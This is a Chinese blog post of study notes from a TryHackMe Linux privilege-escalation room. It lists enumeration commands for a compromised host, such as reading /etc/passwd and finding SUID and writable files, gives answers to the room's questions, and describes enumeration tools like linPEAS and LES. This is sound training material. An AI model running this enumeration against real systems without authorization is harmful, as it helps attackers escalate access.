<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【学习笔记】[THM]Linux Privilege Escalation(linux提权) | lan1ocのblog</title><meta name="author" content="lan1oc"><meta name="copyright" content="lan1oc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集假设已经拿下权限，那就先收集下这台机器的信息 主机名1hostname   系统信息1uname -a   内核版本和其他数据的信息1cat &#x2F;proc&#x2F;version   &#x2F;etc&#x2F;issue 系统版本1cat &#x2F;etc&#x2F;issue   看进程1234ps -A：查看所有正在运行的进程ps axjf：查看进程树（请参阅下面的树结构，直到运行 ps axjf）ps au">
<meta property="og:type" content="article">
<meta property="og:title" content="【学习笔记】[THM]Linux Privilege Escalation(linux提权)">
<meta property="og:url" content="http://lan1oc.co/2025/04/11/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Linux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/index.html">
<meta property="og:site_name" content="lan1ocのblog">
<meta property="og:description" content="信息收集假设已经拿下权限，那就先收集下这台机器的信息 主机名1hostname   系统信息1uname -a   内核版本和其他数据的信息1cat &#x2F;proc&#x2F;version   &#x2F;etc&#x2F;issue 系统版本1cat &#x2F;etc&#x2F;issue   看进程1234ps -A：查看所有正在运行的进程ps axjf：查看进程树（请参阅下面的树结构，直到运行 ps axjf）ps au">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://lan1oc.co/img/cover/1.webp">
<meta property="article:published_time" content="2025-04-11T08:00:00.000Z">
<meta property="article:modified_time" content="2025-04-22T08:00:00.000Z">
<meta property="article:author" content="lan1oc">
<meta property="article:tag" content="THM记录">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://lan1oc.co/img/cover/1.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "【学习笔记】[THM]Linux Privilege Escalation(linux提权)",
  "url": "http://lan1oc.co/2025/04/11/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Linux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/",
  "image": "http://lan1oc.co/img/cover/1.webp",
  "datePublished": "2025-04-11T08:00:00.000Z",
  "dateModified": "2025-04-22T08:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "lan1oc",
      "url": "http://lan1oc.co/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.ico"><link rel="canonical" href="http://lan1oc.co/2025/04/11/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Linux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【学习笔记】[THM]Linux Privilege Escalation(linux提权)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/4.webp);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/1.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">lan1ocのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">【学习笔记】[THM]Linux Privilege Escalation(linux提权)</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">【学习笔记】[THM]Linux Privilege Escalation(linux提权)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-11T08:00:00.000Z" title="发表于 2025-04-11 16:00:00">2025-04-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-22T08:00:00.000Z" title="更新于 2025-04-22 16:00:00">2025-04-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>假设已经拿下权限，那就先收集下这台机器的信息</p>
<h2 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/1.png"></p>
<h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/2.png"></p>
<h2 id="内核版本和其他数据的信息"><a href="#内核版本和其他数据的信息" class="headerlink" title="内核版本和其他数据的信息"></a>内核版本和其他数据的信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412183649.png"></p>
<h2 id="etc-issue-系统版本"><a href="#etc-issue-系统版本" class="headerlink" title="&#x2F;etc&#x2F;issue 系统版本"></a>&#x2F;etc&#x2F;issue 系统版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412183615.png"></p>
<h2 id="看进程"><a href="#看进程" class="headerlink" title="看进程"></a>看进程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -A：查看所有正在运行的进程</span><br><span class="line">ps axjf：查看进程树（请参阅下面的树结构，直到运行 ps axjf）</span><br><span class="line">ps aux：aux 选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未连接到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一般直接用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure>

<h2 id="看环境变量"><a href="#看环境变量" class="headerlink" title="看环境变量"></a>看环境变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/3.png"><br>重点看path变量<br>PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升。</p>
<h2 id="看允许用户使用-root-权限运行哪些命令-鸡肋，要密码"><a href="#看允许用户使用-root-权限运行哪些命令-鸡肋，要密码" class="headerlink" title="看允许用户使用 root 权限运行哪些命令(鸡肋，要密码)"></a>看允许用户使用 root 权限运行哪些命令(鸡肋，要密码)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<h2 id="看用户组"><a href="#看用户组" class="headerlink" title="看用户组"></a>看用户组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>

<p>也可看其他用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id root</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412183513.png"></p>
<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p>这里面会记录系统的用户<br>可以直接读取用户名，这个文件一般以:分隔，然后用户名一般都在第一列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd|cut -d &quot;:&quot; -f 1</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412183842.png"><br>这是获取所有用户名，但还要查找真实用户，一般用户文件都会在home文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd|grep home|cut -d &quot;:&quot; -f 1</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412184143.png"><br>或者不切割直接看&#96;&#96;&#96;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd|grep home</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412184248.png"></p>
<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>

<p>查看早期的命令可以让我们对目标系统有所了解，并且尽管很少存储密码或用户名等信息<br>甚至有时候靶机上还没有这个</p>
<h2 id="系统网络接口的信息"><a href="#系统网络接口的信息" class="headerlink" title="系统网络接口的信息"></a>系统网络接口的信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412190017.png"><br>假设我们可以看到有不能访问到的接口，可以通过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route</span><br></pre></td></tr></table></figure>

<p>查看存在哪些网络路由<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250412185944.png"></p>
<h2 id="看网络统计信息"><a href="#看网络统计信息" class="headerlink" title="看网络统计信息"></a>看网络统计信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netstat -a：显示所有侦听端口和已建立的连接。</span><br><span class="line">netstat -at 或 netstat -au 也可以分别用于列出 TCP 或 UDP 协议。</span><br><span class="line">netstat -l：列出处于 “listening” 模式的端口。这些端口已打开并准备好接受传入连接。这可以与 “t” 选项一起使用，以仅列出正在使用 TCP 协议侦听的端口</span><br><span class="line">netstat -s：按协议列出网络使用统计信息（如下）这也可以与 -t 或 -u 选项一起使用，以将输出限制为特定协议</span><br><span class="line">netstat -tp：列出带有服务名称和 PID 的连接 信息</span><br><span class="line">netstat -i：显示接口统计信息。我们在下面看到，“eth0” 和 “tun0” 比 “tun1” 更活跃</span><br><span class="line">-a：显示所有套接字</span><br><span class="line">-n：不解析名称</span><br><span class="line">-o：显示计时器</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="find-find命令往往会产生错误，因此一般都会加一个：2-dev-null"><a href="#find-find命令往往会产生错误，因此一般都会加一个：2-dev-null" class="headerlink" title="find(find命令往往会产生错误，因此一般都会加一个：2&gt;&#x2F;dev&#x2F;null)"></a>find(find命令往往会产生错误，因此一般都会加一个：2&gt;&#x2F;dev&#x2F;null)</h2><p>在当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name file</span><br></pre></td></tr></table></figure>

<p>在<code>/</code>目录查找名为<code>file</code>的目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type d -name file</span><br></pre></td></tr></table></figure>

<p>查找具有 777 权限的文件（所有用户均可读取、可写和可执行的文件）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm 0777</span><br></pre></td></tr></table></figure>

<p>查找可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm a=x</span><br></pre></td></tr></table></figure>

<p>在“&#x2F;home”下查找用户“frank”的所有文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home -user frank</span><br></pre></td></tr></table></figure>

<p>查找最近十天修改的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -mtime 10</span><br></pre></td></tr></table></figure>

<p>查找过去十天内访问的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -atime 10</span><br></pre></td></tr></table></figure>

<p>查找在过去一小时内更改的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -cmin -60</span><br></pre></td></tr></table></figure>

<p>查找在过去一小时内访问的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -amin -60</span><br></pre></td></tr></table></figure>

<p>查找大小为50M的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -size 50M</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此命令还可以与 （+） 和 （-） 符号一起使用，以指定大于或小于给定大小的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以写入或从中执行的文件夹和文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -222 -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -o w -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -o x -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查找全局可执行文件文件夹</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查找特定文件权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查找具有 SUID 位的文件，这允许我们以比当前用户更高的权限级别运行文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h2><p>目标系统的主机名是什么？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wade7363</span><br></pre></td></tr></table></figure>

<p>目标系统的 Linux 内核版本是什么？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.13.0-24-generic</span><br></pre></td></tr></table></figure>

<p>这是什么 Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 14.04 LTS</span><br></pre></td></tr></table></figure>

<p>系统安装了哪个版本的 Python 语言</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.7.6</span><br></pre></td></tr></table></figure>

<p>哪个漏洞似乎影响了目标系统的内核？（输入 CVE 编号）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2015-1328</span><br></pre></td></tr></table></figure>

<h1 id="自动枚举工具"><a href="#自动枚举工具" class="headerlink" title="自动枚举工具"></a>自动枚举工具</h1><p>有几种工具可以帮助您在普查过程中节省时间。这些工具仅用于节省时间，因为它们可能会错过一些权限提升向量。以下是流行的 Linux 枚举工具列表，以及指向其各自 Github 存储库的链接。</p>
<h2 id="PEASS-ng感觉是最好用的"><a href="#PEASS-ng感觉是最好用的" class="headerlink" title="PEASS-ng感觉是最好用的"></a><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">PEASS-ng</a><strong>感觉是最好用的</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">搜索可以利用的可能的本地权限提升路径 ，并以漂亮的颜色打印，以便轻松识别错误配置</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="可以先用les-sh-提权漏扫，扫出了直接用，用不了再用本体信息收集"><a href="#可以先用les-sh-提权漏扫，扫出了直接用，用不了再用本体信息收集" class="headerlink" title="可以先用les.sh(提权漏扫，扫出了直接用，用不了再用本体信息收集)"></a>可以先用les.sh(提权漏扫，扫出了直接用，用不了再用本体信息收集)</h3><h2 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./LinEnum.sh -s -k keyword -r report -e /tmp/ -t</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-k Enter keyword  -k Enter 关键字</span><br><span class="line">-e Enter export location  -e 输入导出位置</span><br><span class="line">-t Include thorough (lengthy) tests</span><br><span class="line">-t 包括彻底的（漫长的）测试</span><br><span class="line">-s Supply current user password to check sudo perms (INSECURE)</span><br><span class="line">-s 提供当前用户密码以检查 sudo 烫发 （不安全）</span><br><span class="line">-r Enter report name  -r 输入报表名称</span><br><span class="line">-h Displays this help text</span><br><span class="line">-h 显示此帮助文本</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="LES-Linux-Exploit-Suggester"><a href="#LES-Linux-Exploit-Suggester" class="headerlink" title="LES (Linux Exploit Suggester)"></a><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">LES (Linux Exploit Suggester)</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Highly probable - 评估的内核很可能受到影响，并且 PoC 漏洞很有可能无需任何重大修改即可直接运行。</span><br><span class="line">Probable - 漏洞有可能生效，但很可能需要根据目标定制 PoC 漏洞。</span><br><span class="line">Less probable - 需要进行额外的手动分析以验证内核是否受到影响。</span><br><span class="line">Unprobable - 内核极不可能受到影响（漏洞不会显示在工具的输出中）。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Linux-Smart-Enumeration这个也还行"><a href="#Linux-Smart-Enumeration这个也还行" class="headerlink" title="Linux Smart Enumeration这个也还行"></a><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a><strong>这个也还行</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">    -c</span><br><span class="line">        禁用颜色输出。默认情况下，脚本会使用颜色来区分不同类型的信息和风险等级，这个选项会关闭颜色显示。</span><br><span class="line">    -i</span><br><span class="line">        非交互模式。在非交互模式下，脚本不会等待用户输入，会直接运行并输出结果，这对于自动化执行或在脚本中调用很有用。</span><br><span class="line">    -h</span><br><span class="line">        显示帮助信息。运行脚本时加上这个参数会显示参数的用法说明（也就是您提供的这段文本）。</span><br><span class="line">    -l LEVEL</span><br><span class="line">        设置输出的详细级别。</span><br><span class="line">        0: 只显示非常重要的结果。（默认级别）</span><br><span class="line">        1: 显示所有“有趣”的结果（包括重要和一些次要但可能相关的信息）。</span><br><span class="line">        2: 显示所有收集到的信息（最详细的级别，包括所有检查项目的输出）。</span><br><span class="line">    -s SELECTION</span><br><span class="line">        指定要运行的检查部分或特定测试，多个选择之间用逗号分隔。可用的检查部分有：</span><br><span class="line">        usr: 用户相关的测试。</span><br><span class="line">        sud: Sudo 相关的测试。</span><br><span class="line">        fst: 文件系统相关的测试。</span><br><span class="line">        sys: 系统相关的测试。</span><br><span class="line">        sec: 安全措施相关的测试。</span><br><span class="line">        ret: 重复性任务（cron 定时任务, systemd timers）相关的测试。</span><br><span class="line">        net: 网络相关的测试。</span><br><span class="line">        srv: 服务相关的测试。</span><br><span class="line">        pro: 进程相关的测试。</span><br><span class="line">        sof: 软件相关的测试。</span><br><span class="line">        ctn: 容器（docker, lxc）相关的测试。</span><br><span class="line">        cve: CVE (已知漏洞) 相关的测试。</span><br><span class="line">        也可以使用特定的测试ID（例如：usr020,sud）来指定运行更精细的测试。</span><br><span class="line">    -e PATHS</span><br><span class="line">        指定要排除扫描的路径列表，多个路径之间用逗号分隔。使用这个选项可以加快扫描速度，但会牺牲检查的完整性。</span><br><span class="line">    -p SECONDS</span><br><span class="line">        进程监控的时间，单位为秒。脚本会在这段时间内监控进程活动。设置为 0 会禁用任何进程监控（默认是 60 秒）。</span><br><span class="line">    -S</span><br><span class="line">        在本机上启动一个简单的HTTP服务，用于提供 lse.sh 脚本（通常与 linpeas.sh 在同一 PEASS-ng 项目中，用于更深入的枚举），以便可以从远程主机下载。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>它还有个子项目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/package_cvs_into_lse.sh</span><br></pre></td></tr></table></figure>

<p>运行以上命令编译成<code>./lse_cve.sh</code><br>然后可以测试cve，但实际没什么用，测试的脚本是在cve文件夹里，内置的的很少<br><a target="_blank" rel="noopener" href="https://github.com/linted/linuxprivchecker">Linux Priv Checker</a></p>
